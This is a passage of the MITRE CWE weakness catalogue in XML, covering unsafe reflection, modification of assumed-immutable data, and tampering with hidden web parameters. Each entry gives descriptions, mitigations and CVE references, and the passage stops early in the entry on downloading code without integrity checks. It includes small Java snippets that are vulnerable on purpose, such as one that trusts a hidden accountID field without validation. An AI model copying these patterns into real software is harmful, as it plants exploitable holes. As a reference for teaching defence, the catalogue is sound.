               <Body_Text>Although this is an improvement, it encourages a decentralized approach to access control, which makes it easier for programmers to make access control mistakes. This code also highlights another security problem with using reflection to build a command dispatcher. An attacker can invoke the default constructor for any kind of object. In fact, the attacker is not even constrained to objects that implement the Worker interface; the default constructor for any object in the system can be invoked. If the object does not implement the Worker interface, a ClassCastException will be thrown before the assignment to ao, but if the constructor performs operations that work in the attacker's favor, the damage will already have been done. Although this scenario is relatively benign in simple products, in larger products where complexity grows exponentially it is not unreasonable that an attacker could find a constructor to leverage as part of an attack.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2004-2331</Reference>
               <Description>Database system allows attackers to bypass sandbox restrictions by using the Reflection APi.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2004-2331</Link>
            </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="7 Pernicious Kingdoms">
               <Entry_Name>Unsafe Reflection</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="The CERT Oracle Secure Coding Standard for Java (2011)">
               <Entry_ID>SEC06-J</Entry_ID>
               <Entry_Name>Do not use reflection to increase accessibility of classes, methods, or fields</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="138"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-6"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>7 Pernicious Kingdoms</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Organization>KDM Analytics</Modification_Organization>
               <Modification_Date>2008-08-01</Modification_Date>
               <Modification_Comment>added/updated white box definitions</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Description, Relationships, Other_Notes, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-10-14</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Demonstrative_Examples, Description, Other_Notes</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-01-12</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Common_Consequences, Demonstrative_Examples, Observed_Examples, Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-05-27</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Name</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-10-29</Modification_Date>
               <Modification_Comment>updated Alternate_Terms, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-03-29</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2013-02-21</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated White_Box_Definitions</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-01-03</Modification_Date>
					<Modification_Comment>updated Taxonomy_Mappings</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-06-20</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated References, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-06-25</Modification_Date>
					<Modification_Comment>updated Potential_Mitigations</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Common_Consequences, Demonstrative_Examples, Description, Related_Attack_Patterns, Relationships</Modification_Comment>
				</Modification>
            <Previous_Entry_Name Date="2008-04-11">Unsafe Reflection</Previous_Entry_Name>
            <Previous_Entry_Name Date="2009-05-27">Use of Externally-Controlled Input to Select Classes or Code (aka 'Unsafe Reflection')</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="471" Name="Modification of Assumed-Immutable Data (MAID)" Abstraction="Base" Structure="Simple" Status="Draft">
         <Description>The product does not properly protect an assumed-immutable element from being modified by an attacker.</Description>
         <Extended_Description>This occurs when a particular input is critical enough to the functioning of the application that it should not be modifiable at all, but it is. Certain resources are often assumed to be immutable when they are not, such as hidden form fields in web applications, cookies, and reverse DNS lookups.</Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="664" View_ID="1000" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
            </Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Integrity</Scope>
               <Impact>Modify Application Data</Impact>
               <Note>Common data types that are attacked are environment variables, web application parameters, and HTTP headers.</Note>
            </Consequence>
            <Consequence>
               <Scope>Integrity</Scope>
               <Impact>Unexpected State</Impact>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Phase>Operation</Phase>
               <Phase>Implementation</Phase>
               <Description>When the data is stored or transmitted through untrusted sources that could modify the data, implement integrity checks to detect unauthorized modification, or store/transmit the data in a trusted location that is free from external influence.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>In the code excerpt below, an array returned by a Java method is modified despite the fact that arrays are mutable.</Intro_Text>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>String[] colors = car.getAllPossibleColors();<xhtml:br/>colors[0] = "Red";</xhtml:div>
               </Example_Code>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2002-1757</Reference>
               <Description>Relies on $PHP_SELF variable for authentication.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2002-1757</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-1905</Reference>
               <Description>Gain privileges by modifying assumed-immutable code addresses that are accessed by a driver.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-1905</Link>
            </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="PLOVER">
               <Entry_Name>Modification of Assumed-Immutable Data</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="384"/>
            <Related_Attack_Pattern CAPEC_ID="385"/>
            <Related_Attack_Pattern CAPEC_ID="386"/>
            <Related_Attack_Pattern CAPEC_ID="387"/>
            <Related_Attack_Pattern CAPEC_ID="388"/>
         </Related_Attack_Patterns>
         <Notes>
            <Note Type="Relationship">MAID issues can be primary to many other weaknesses, and they are a major factor in languages that provide easy access to internal program constructs, such as PHP's register_globals and similar features. However, MAID issues can also be resultant from weaknesses that modify internal state; for example, a program might validate some data and store it in memory, but a buffer overflow could overwrite that validated data, leading to a change in program logic.</Note>
            <Note Type="Theoretical">There are many examples where the MUTABILITY property is a major factor in a vulnerability.</Note>
         </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>PLOVER</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>Sean Eidemiller</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>added/updated demonstrative examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Relationships, Other_Notes, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-07-27</Modification_Date>
               <Modification_Comment>updated Other_Notes</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-04-05</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-12-13</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2013-02-21</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2013-07-17</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-02-18</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-06-23</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Common_Consequences, Description, Other_Notes, Potential_Mitigations, Relationship_Notes, Theoretical_Notes, Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-05-03</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2018-03-27</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-06-25</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-12-10</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Description</Modification_Comment>
				</Modification>
         </Content_History>
      </Weakness>
      <Weakness ID="472" Name="External Control of Assumed-Immutable Web Parameter" Abstraction="Base" Structure="Simple" Status="Draft">
         <Description>The web application does not sufficiently verify inputs that are assumed to be immutable but are actually externally controllable, such as hidden form fields.</Description>
         <Extended_Description>
            <xhtml:p>If a web product does not properly protect assumed-immutable values from modification in hidden form fields, parameters, cookies, or URLs, this can lead to modification of critical data. Web applications often mistakenly make the assumption that data passed to the client in hidden fields or cookies is not susceptible to tampering. Improper validation of data that are user-controllable can lead to the application processing incorrect, and often malicious, input.</xhtml:p>
            <xhtml:p>For example, custom cookies commonly store session data or persistent data across sessions. This kind of session data is normally involved in security related decisions on the server side, such as user authentication and access control. Thus, the cookies might contain sensitive data such as user credentials and privileges. This is a dangerous practice, as it can often lead to improper reliance on the value of the client-provided cookie by the server side application.</xhtml:p>
         </Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="642" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="471" View_ID="1000"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Alternate_Terms>
            <Alternate_Term>
               <Term>Assumed-Immutable Parameter Tampering</Term>
            </Alternate_Term>
         </Alternate_Terms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Integrity</Scope>
               <Impact>Modify Application Data</Impact>
               <Note>Without appropriate protection mechanisms, the client can easily tamper with cookies and similar web data. Reliance on the cookies without detailed validation can lead to problems such as SQL injection. If you use cookie values for security related decisions on the server side, manipulating the cookies might lead to violations of security policies such as authentication bypassing, user impersonation and privilege escalation. In addition, storing sensitive data in the cookie without appropriate protection can also lead to disclosure of sensitive user data, especially data stored in persistent cookies.</Note>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation Mitigation_ID="MIT-5">
               <Phase>Implementation</Phase>
               <Strategy>Input Validation</Strategy>
               <Description>
                  <xhtml:p>Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.</xhtml:p>
                  <xhtml:p>When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."</xhtml:p>
                  <xhtml:p>Do not rely exclusively on looking for malicious or malformed inputs.  This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-20">
               <Phase>Implementation</Phase>
               <Strategy>Input Validation</Strategy>
               <Description>Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass allowlist validation schemes by introducing dangerous inputs after they have been checked.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>In this example, a web application uses the value of a hidden form field (accountID) without having done any input validation because it was assumed to be immutable.</Intro_Text>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>String accountID = request.getParameter("accountID");<xhtml:br/>User user = getUserFromID(Long.parseLong(accountID));</xhtml:div>
               </Example_Code>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>Hidden fields should not be trusted as secure parameters.</Intro_Text>
               <Body_Text>An attacker can intercept and alter hidden fields in a post to the server as easily as user input fields. An attacker can simply parse the HTML for the substring:</Body_Text>
               <Example_Code Nature="Bad" Language="HTML">
                  <xhtml:div>&lt;input type="hidden"</xhtml:div>
               </Example_Code>
               <Body_Text>or even just "hidden". Hidden field values displayed later in the session, such as on the following page, can open a site up to cross-site scripting attacks.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2002-0108</Reference>
               <Description>Forum product allows spoofed messages of other users via hidden form fields for name and e-mail address.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2002-0108</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2000-0253</Reference>
               <Description>Shopping cart allows price modification via hidden form field.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2000-0253</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2000-0254</Reference>
               <Description>Shopping cart allows price modification via hidden form field.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2000-0254</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2000-0926</Reference>
               <Description>Shopping cart allows price modification via hidden form field.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2000-0926</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2000-0101</Reference>
               <Description>Shopping cart allows price modification via hidden form field.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2000-0101</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2000-0102</Reference>
               <Description>Shopping cart allows price modification via hidden form field.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2000-0102</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2000-0758</Reference>
               <Description>Allows admin access by modifying value of form field.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2000-0758</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2002-1880</Reference>
               <Description>Read messages by modifying message ID parameter.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2002-1880</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2000-1234</Reference>
               <Description>Send email to arbitrary users by modifying email parameter.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2000-1234</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-1652</Reference>
               <Description>Authentication bypass by setting a parameter.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-1652</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-1784</Reference>
               <Description>Product does not check authorization for configuration change admin script, leading to password theft via modified e-mail address field.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-1784</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-2314</Reference>
               <Description>Logic error leads to password disclosure.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-2314</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-1682</Reference>
               <Description>Modification of message number parameter allows attackers to read other people's messages.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-1682</Link>
            </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="PLOVER">
               <Entry_Name>Web Parameter Tampering</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2007">
               <Entry_ID>A4</Entry_ID>
               <Entry_Name>Insecure Direct Object Reference</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2004">
               <Entry_ID>A1</Entry_ID>
               <Entry_Name>Unvalidated Input</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="146"/>
            <Related_Attack_Pattern CAPEC_ID="226"/>
            <Related_Attack_Pattern CAPEC_ID="31"/>
            <Related_Attack_Pattern CAPEC_ID="39"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-44" Section="&#34;Sin 4: Use of Magic URLs, Predictable Cookies, and Hidden Form&#xA;                  Fields.&#34; Page 75"/>
            <Reference External_Reference_ID="REF-62" Section="Chapter 17, &#34;Embedding State in HTML and URLs&#34;, Page 1032"/>
         </References>
         <Notes>
            <Note Type="Relationship">This is a primary weakness for many other weaknesses and functional consequences, including XSS, SQL injection, path disclosure, and file inclusion.</Note>
            <Note Type="Theoretical">This is a technology-specific MAID problem.</Note>
         </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>PLOVER</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>Sean Eidemiller</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>added/updated demonstrative examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Description, Relationships, Other_Notes, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-01-12</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-07-27</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-10-29</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Demonstrative_Examples, Description, Other_Notes, Relationship_Notes, Theoretical_Notes</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-04-05</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-12-13</Modification_Date>
               <Modification_Comment>updated Description</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-03-29</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-27</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Demonstrative_Examples, Modes_of_Introduction, Relationships</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-01-03</Modification_Date>
					<Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-06-20</Modification_Date>
					<Modification_Comment>updated Related_Attack_Patterns, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Potential_Mitigations, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-06-25</Modification_Date>
					<Modification_Comment>updated Potential_Mitigations</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
            <Previous_Entry_Name Date="2008-04-11">Web Parameter Tampering</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="494" Name="Download of Code Without Integrity Check" Abstraction="Base" Structure="Simple" Status="Draft">
         <Description>The product downloads source code or an executable from a remote location and executes the code without sufficiently verifying the origin and integrity of the code.</Description>
         <Extended_Description>An attacker can execute malicious code by compromising the host server, performing DNS spoofing, or modifying the code in transit.</Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="345" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="669" View_ID="1000"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="669" View_ID="1003" Ordinal="Primary"/>
            <Related_Weakness Nature="PeerOf" CWE_ID="79" View_ID="1000"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
               <Note>OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase.</Note>
            </Introduction>
